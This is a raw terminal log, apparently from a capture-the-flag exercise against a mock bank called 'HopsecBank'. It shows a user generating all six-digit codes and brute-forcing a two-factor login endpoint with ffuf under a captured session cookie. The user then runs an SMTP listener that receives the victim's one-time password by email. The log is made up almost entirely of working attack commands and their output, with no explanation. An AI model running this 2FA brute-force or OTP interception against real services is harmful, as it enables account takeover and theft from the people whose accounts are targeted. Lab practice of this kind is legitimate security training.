
```
root@ip-10-48-111-200:~# seq -w 0 999999 > codes.txt
root@ip-10-48-111-200:~# COOKIE='session=.eJxtj11rwkAQRf_LPIsPKX40IKjgQwttTRsUEQmzm4lZ3Oza2UlESv-7WlCK5vmeey73B7CWkpwYjUI5xMI1dUCh22VRgZn2OUEMq35qF5_J4G3RWyYNfa2Ok-f0ZTt8lUgG2H_fDpO9eqK5nhym32nx0USzEfzTNMSmMBd_gTZcB9Baf6A8y32FxgWI10AYhFjVzhkKXSkr2NzBdGbtH6uR2cs5pPFjrQMV2hK5Lbsp267XgdhhdXkdFBPqUlmvd8Qtot8TkGpzmQ.aUpUuw.lQbR5-wD3QPxVos09eGYYGnQyEU'
root@ip-10-48-111-200:~# 
root@ip-10-48-111-200:~# ffuf -k \
>   -w codes.txt \
>   -u https://10.48.172.83:8443/api/verify-2fa \
>   -X POST \
>   -H "Content-Type: application/json" \
>   -H "Cookie: $COOKIE" \
>   -d '{"code":"FUZZ"}' \
>   -mc 200 \
>   -fr "Invalid code"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : https://10.48.172.83:8443/api/verify-2fa
 :: Wordlist         : FUZZ: codes.txt
 :: Header           : Content-Type: application/json
 :: Header           : Cookie: session=.eJxtj11rwkAQRf_LPIsPKX40IKjgQwttTRsUEQmzm4lZ3Oza2UlESv-7WlCK5vmeey73B7CWkpwYjUI5xMI1dUCh22VRgZn2OUEMq35qF5_J4G3RWyYNfa2Ok-f0ZTt8lUgG2H_fDpO9eqK5nhym32nx0USzEfzTNMSmMBd_gTZcB9Baf6A8y32FxgWI10AYhFjVzhkKXSkr2NzBdGbtH6uR2cs5pPFjrQMV2hK5Lbsp267XgdhhdXkdFBPqUlmvd8Qtot8TkGpzmQ.aUpUuw.lQbR5-wD3QPxVos09eGYYGnQyEU
 :: Data             : {"code":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Regexp: Invalid code
```

```
pip3 install aiosmtpd

root@ip-10-48-111-200:~# aiosmtpd -n -l 0.0.0.0:25 -c aiosmtpd.handlers.Debugging stdout
---------- MESSAGE FOLLOWS ----------
Received: from [172.18.0.2] (sq5_app-v2_1.sq5_default [172.18.0.2])
	by hostname (Postfix) with ESMTP id E70CDFAA58
	for <jalil@[10.48.111.200]>; Tue, 23 Dec 2025 09:10:33 +0000 (UTC)
X-Peer: ('10.48.172.83', 60278)

    Subject: Your OTP for HopsecBank

    Dear you,
    The OTP to access your banking app is 881010.

    Thanks for trusting Hopsec Bank!
------------ END MESSAGE ------------```
